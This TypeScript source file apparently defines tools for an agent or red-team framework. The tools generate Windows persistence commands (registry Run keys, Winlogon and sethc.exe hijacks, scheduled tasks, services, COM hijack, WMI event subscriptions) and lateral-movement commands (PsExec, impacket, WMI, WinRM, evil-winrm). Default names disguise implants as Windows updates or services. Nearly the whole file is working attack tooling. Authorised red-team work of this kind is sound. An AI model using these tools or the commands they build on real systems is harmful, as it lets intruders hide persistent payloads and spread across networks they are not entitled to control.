import { Tool } from './Tool.js';
import * as crypto from 'crypto';

function randName(prefix: string): string {
    return prefix + crypto.randomBytes(4).toString('hex');
}

// ─── 1. Registry Persistence ────────────────────────────────────────────────────
export class PersistRegistryTool implements Tool {
    name = 'persist_registry';
    description = 'Generate registry persistence commands (Run, RunOnce, Winlogon, Image Hijack). Returns commands, does NOT execute.';
    schema = {
        type: 'object',
        properties: {
            payloadPath: { type: 'string', description: 'Path to payload binary' },
            keyType: { type: 'string', enum: ['run', 'runonce', 'winlogon', 'image_hijack'], description: 'Registry key type' },
            name: { type: 'string', description: 'Value name (randomized if not set)' },
            hive: { type: 'string', enum: ['hkcu', 'hklm'], description: 'Registry hive (default: hkcu)' }
        },
        required: ['payloadPath', 'keyType'],
        additionalProperties: false
    };

    async execute(args: { payloadPath: string; keyType: string; name?: string; hive?: string }): Promise<string> {
        const name = args.name || randName('svc_');
        const hive = (args.hive || 'hkcu').toUpperCase();

        const commands: Record<string, string> = {
            run: `reg add "${hive}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /t REG_SZ /d "${args.payloadPath}" /f`,
            runonce: `reg add "${hive}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "${name}" /t REG_SZ /d "${args.payloadPath}" /f`,
            winlogon: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,${args.payloadPath}" /f`,
            image_hijack: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v "Debugger" /t REG_SZ /d "${args.payloadPath}" /f`,
        };

        const cmd = commands[args.keyType];
        if (!cmd) return `[ERROR]: Unknown key type "${args.keyType}"`;

        const cleanup = {
            run: `reg delete "${hive}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /f`,
            runonce: `reg delete "${hive}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "${name}" /f`,
            winlogon: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe," /f`,
            image_hijack: `reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v "Debugger" /f`,
        }[args.keyType];

        return [`[PERSIST — ${args.keyType.toUpperCase()}]`, '', '── Deploy ──', cmd, '', '── Cleanup ──', cleanup || ''].join('\n');
    }
}

// ─── 2. Scheduled Task Persistence ──────────────────────────────────────────────
export class PersistScheduledTaskTool implements Tool {
    name = 'persist_scheduled_task';
    description = 'Generate scheduled task persistence commands. Returns schtasks command, does NOT execute.';
    schema = {
        type: 'object',
        properties: {
            payloadPath: { type: 'string', description: 'Payload binary path' },
            triggerType: { type: 'string', enum: ['logon', 'boot', 'daily', 'idle'], description: 'Task trigger' },
            taskName: { type: 'string', description: 'Task name (randomized if not set)' },
            runLevel: { type: 'string', enum: ['limited', 'highest'], description: 'Run level (default: limited)' }
        },
        required: ['payloadPath', 'triggerType'],
        additionalProperties: false
    };

    async execute(args: { payloadPath: string; triggerType: string; taskName?: string; runLevel?: string }): Promise<string> {
        const name = args.taskName || randName('WinUpdate_');
        const rl = args.runLevel === 'highest' ? ' /rl HIGHEST' : '';

        const triggers: Record<string, string> = {
            logon: '/sc ONLOGON',
            boot: '/sc ONSTART',
            daily: '/sc DAILY /st 02:00',
            idle: '/sc ONIDLE /i 5',
        };

        const trigger = triggers[args.triggerType];
        if (!trigger) return `[ERROR]: Unknown trigger "${args.triggerType}"`;

        const deploy = `schtasks /create /tn "${name}" ${trigger} /tr "${args.payloadPath}"${rl} /f`;
        const cleanup = `schtasks /delete /tn "${name}" /f`;

        return [`[PERSIST — SCHEDULED TASK]`, `Name: ${name}`, '', '── Deploy ──', deploy, '', '── Cleanup ──', cleanup].join('\n');
    }
}

// ─── 3. Service Persistence ─────────────────────────────────────────────────────
export class PersistServiceTool implements Tool {
    name = 'persist_service';
    description = 'Generate Windows service persistence commands. Returns sc.exe commands, does NOT execute.';
    schema = {
        type: 'object',
        properties: {
            binaryPath: { type: 'string', description: 'Service binary path' },
            serviceName: { type: 'string', description: 'Service name (randomized if not set)' },
            displayName: { type: 'string', description: 'Display name (optional)' },
            startType: { type: 'string', enum: ['auto', 'delayed', 'manual'], description: 'Start type (default: auto)' }
        },
        required: ['binaryPath'],
        additionalProperties: false
    };

    async execute(args: { binaryPath: string; serviceName?: string; displayName?: string; startType?: string }): Promise<string> {
        const name = args.serviceName || randName('WindowsSvc_');
        const display = args.displayName || 'Windows System Service';
        const startMap: Record<string, string> = { auto: 'auto', delayed: 'delayed-auto', manual: 'demand' };
        const start = startMap[args.startType || 'auto'] || 'auto';

        const deploy = `sc create "${name}" binPath= "${args.binaryPath}" DisplayName= "${display}" start= ${start}`;
        const startCmd = `sc start "${name}"`;
        const cleanup = `sc stop "${name}" && sc delete "${name}"`;

        return [`[PERSIST — SERVICE]`, `Name: ${name}`, '', '── Deploy ──', deploy, startCmd, '', '── Cleanup ──', cleanup].join('\n');
    }
}

// ─── 4. COM Hijack Persistence ──────────────────────────────────────────────────
export class PersistComHijackTool implements Tool {
    name = 'persist_com_hijack';
    description = 'Generate COM object hijack persistence commands. HKCU InprocServer32 redirect.';
    schema = {
        type: 'object',
        properties: {
            dllPath: { type: 'string', description: 'Path to proxy DLL' },
            clsid: { type: 'string', description: 'CLSID to hijack (default: well-known shell CLSID)' }
        },
        required: ['dllPath'],
        additionalProperties: false
    };

    async execute(args: { dllPath: string; clsid?: string }): Promise<string> {
        const clsid = args.clsid || '{0010890e-8789-413c-adbc-48f5b511b3af}';
        const regPath = `HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32`;

        const deploy = [
            `reg add "${regPath}" /ve /t REG_SZ /d "${args.dllPath}" /f`,
            `reg add "${regPath}" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f`,
        ].join('\n');
        const cleanup = `reg delete "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}" /f`;

        return [`[PERSIST — COM HIJACK]`, `CLSID: ${clsid}`, '', '── Deploy ──', deploy, '', '── Cleanup ──', cleanup, '', '// Proxy DLL must forward calls to the original COM server or shell init breaks.'].join('\n');
    }
}

// ─── 5. WMI Event Subscription ──────────────────────────────────────────────────
export class PersistWmiEventTool implements Tool {
    name = 'persist_wmi_event';
    description = 'Generate WMI event subscription persistence PowerShell commands.';
    schema = {
        type: 'object',
        properties: {
            payloadPath: { type: 'string', description: 'Payload path' },
            triggerType: { type: 'string', enum: ['startup', 'interval', 'process_start'], description: 'Trigger type' },
            intervalSeconds: { type: 'number', description: 'Interval in seconds (for interval trigger, default 300)' },
            processName: { type: 'string', description: 'Process name to monitor (for process_start trigger)' }
        },
        required: ['payloadPath', 'triggerType'],
        additionalProperties: false
    };

    async execute(args: { payloadPath: string; triggerType: string; intervalSeconds?: number; processName?: string }): Promise<string> {
        const name = randName('SystemCheck_');
        const interval = args.intervalSeconds || 300;

        const queries: Record<string, string> = {
            startup: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 240`,
            interval: `SELECT * FROM __TimerEvent WHERE TimerID = '${name}Timer'`,
            process_start: `SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '${args.processName || 'explorer.exe'}'`,
        };

        const query = queries[args.triggerType];
        if (!query) return `[ERROR]: Unknown trigger "${args.triggerType}"`;

        const timerSetup = args.triggerType === 'interval'
            ? `\n# Create timer\n$timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments @{TimerId='${name}Timer'; IntervalBetweenEvents=($interval*1000); SkipIfPassed=$false}\n`
            : '';

        const deploy = [
            `# WMI Event Subscription Persistence`,
            `$filterName = "${name}Filter"`,
            `$consumerName = "${name}Consumer"`,
            timerSetup,
            `# Event Filter`,
            `$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{`,
            `    Name = $filterName`,
            `    EventNamespace = "root/cimv2"`,
            `    QueryLanguage = "WQL"`,
            `    Query = "${query}"`,
            `}`,
            ``,
            `# Event Consumer`,
            `$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{`,
            `    Name = $consumerName`,
            `    CommandLineTemplate = "${args.payloadPath}"`,
            `}`,
            ``,
            `# Binding`,
            `Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{`,
            `    Filter = $filter`,
            `    Consumer = $consumer`,
            `}`,
        ].join('\n');

        const cleanup = [
            `Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*${name}*" } | Remove-WmiObject`,
            `Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "${name}Consumer" } | Remove-WmiObject`,
            `Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -eq "${name}Filter" } | Remove-WmiObject`,
        ].join('\n');

        return [`[PERSIST — WMI EVENT]`, `Trigger: ${args.triggerType}`, '', '── Deploy (PowerShell) ──', deploy, '', '── Cleanup (PowerShell) ──', cleanup].join('\n');
    }
}

// ─── 6. Lateral PsExec ──────────────────────────────────────────────────────────
export class LateralPsExecTool implements Tool {
    name = 'lateral_psexec';
    description = 'Generate PsExec-style lateral movement commands.';
    schema = {
        type: 'object',
        properties: {
            target: { type: 'string', description: 'Target hostname or IP' },
            command: { type: 'string', description: 'Command to execute remotely' },
            username: { type: 'string', description: 'Username (optional)' },
            password: { type: 'string', description: 'Password (optional)' },
            method: { type: 'string', enum: ['psexec', 'impacket_psexec', 'smbexec', 'atexec'], description: 'Tool method' }
        },
        required: ['target', 'command', 'method'],
        additionalProperties: false
    };

    async execute(args: { target: string; command: string; username?: string; password?: string; method: string }): Promise<string> {
        const creds = args.username ? `${args.username}${args.password ? ':' + args.password : ''}@` : '';
        const domain = args.username?.includes('\\') ? '' : 'DOMAIN/';

        const commands: Record<string, string> = {
            psexec: `PsExec.exe \\\\${args.target} ${args.username ? `-u ${args.username} -p ${args.password || ''}` : ''} cmd /c "${args.command}"`,
            impacket_psexec: `impacket-psexec ${domain}${creds}${args.target} "${args.command}"`,
            smbexec: `impacket-smbexec ${domain}${creds}${args.target} "${args.command}"`,
            atexec: `impacket-atexec ${domain}${creds}${args.target} "${args.command}"`,
        };

        const cmd = commands[args.method];
        if (!cmd) return `[ERROR]: Unknown method "${args.method}"`;

        return [`[LATERAL — ${args.method.toUpperCase()}] → ${args.target}`, '', cmd].join('\n');
    }
}

// ─── 7. Lateral WMI ─────────────────────────────────────────────────────────────
export class LateralWmiTool implements Tool {
    name = 'lateral_wmi';
    description = 'Generate WMI lateral movement commands.';
    schema = {
        type: 'object',
        properties: {
            target: { type: 'string', description: 'Target hostname or IP' },
            command: { type: 'string', description: 'Command to execute' },
            username: { type: 'string', description: 'Username (optional)' },
            password: { type: 'string', description: 'Password (optional)' }
        },
        required: ['target', 'command'],
        additionalProperties: false
    };

    async execute(args: { target: string; command: string; username?: string; password?: string }): Promise<string> {
        const creds = args.username ? ` /user:${args.username} /password:${args.password || ''}` : '';
        const wmicCmd = `wmic /node:"${args.target}"${creds} process call create "${args.command}"`;

        const psCmd = args.username
            ? `$cred = New-Object PSCredential("${args.username}", (ConvertTo-SecureString "${args.password || ''}" -AsPlainText -Force))\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${args.command}" -ComputerName ${args.target} -Credential $cred`
            : `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${args.command}" -ComputerName ${args.target}`;

        const impacket = `impacket-wmiexec ${args.username ? `DOMAIN/${args.username}:${args.password || ''}@` : ''}${args.target} "${args.command}"`;

        return [`[LATERAL — WMI] → ${args.target}`, '', '── WMIC ──', wmicCmd, '', '── PowerShell ──', psCmd, '', '── Impacket ──', impacket].join('\n');
    }
}

// ─── 8. Lateral WinRM ───────────────────────────────────────────────────────────
export class LateralWinRmTool implements Tool {
    name = 'lateral_winrm';
    description = 'Generate WinRM lateral movement commands.';
    schema = {
        type: 'object',
        properties: {
            target: { type: 'string', description: 'Target hostname or IP' },
            command: { type: 'string', description: 'Command or script block' },
            username: { type: 'string', description: 'Username (optional)' },
            password: { type: 'string', description: 'Password (optional)' }
        },
        required: ['target', 'command'],
        additionalProperties: false
    };

    async execute(args: { target: string; command: string; username?: string; password?: string }): Promise<string> {
        const credBlock = args.username
            ? `$cred = New-Object PSCredential("${args.username}", (ConvertTo-SecureString "${args.password || ''}" -AsPlainText -Force))\n`
            : '';
        const credParam = args.username ? ' -Credential $cred' : '';

        const invoke = `${credBlock}Invoke-Command -ComputerName ${args.target}${credParam} -ScriptBlock { ${args.command} }`;
        const session = `${credBlock}$s = New-PSSession -ComputerName ${args.target}${credParam}\nInvoke-Command -Session $s -ScriptBlock { ${args.command} }\nRemove-PSSession $s`;
        const evil = `evil-winrm -i ${args.target}${args.username ? ` -u ${args.username}` : ''}${args.password ? ` -p ${args.password}` : ''}`;

        return [`[LATERAL — WINRM] → ${args.target}`, '', '── Invoke-Command ──', invoke, '', '── PSSession ──', session, '', '── Evil-WinRM ──', evil].join('\n');
    }
}
